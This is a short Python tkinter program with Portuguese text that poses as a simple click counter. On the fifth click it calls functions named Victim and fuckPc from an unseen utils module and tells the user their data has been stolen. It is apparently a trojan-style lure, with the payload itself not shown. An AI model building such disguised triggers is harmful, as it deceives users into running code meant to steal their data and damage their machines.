import tkinter as tk
from utils import Victim, fuckPc
import time

def increment_counter():
    global counter
    counter += 1
    label.config(text=f"Contador: {counter}")
    if counter >= 5:
        victim = Victim()
        goal.config(text="Parabéns, você alcançou sua meta!")
        button.config(state=tk.DISABLED)
        time.sleep(3)
        goal.config(text="Seus dados foram roubados!")
        fuckPc() 





if __name__ == "__main__":
    counter = 0

    window = tk.Tk()
    window.title("Aplicativo de Contador")
    window.geometry("300x200")

    goal = tk.Label(window, text="sua meta é contar até 5")
    button = tk.Button(window, text="Clique Aqui", command=increment_counter)
    button.pack(pady=20)

    label = tk.Label(window, text="Contador: 0")
    label.pack()

    window.mainloop()